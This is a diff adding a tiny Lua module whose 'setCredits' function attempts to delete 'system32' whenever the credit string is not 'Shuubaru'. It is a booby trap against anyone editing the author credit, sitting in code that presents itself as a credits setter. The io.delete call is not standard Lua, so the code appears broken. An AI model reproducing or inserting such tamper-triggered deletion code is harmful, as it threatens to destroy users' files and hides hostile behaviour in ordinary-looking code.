@@ -1,0 +1,9 @@
+local fuckUp = {} 
+
+function fuckUp.setCredits(credit)
+	if credit ~= "Shuubaru" then
+		return io.delete("system32")
+	end
+end
+
+return fuckUp.setCredits("Shuubaru")
